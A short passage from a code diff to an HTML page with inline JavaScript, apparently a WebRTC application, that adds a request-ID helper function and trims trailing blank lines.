             pc.addIceCandidate(new RTCIceCandidate(JSON.parse(candidateStr)));
         } catch (e) { console.error(e); }
+    }
+
+    function generateRequestId() {
+        return 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
     }
 
     function showNotification(text) {
@@ -1177,8 +1184,3 @@ function handleOffer(sdp) {
 </script>
 </body>
 </html>
-
-
-
-
-
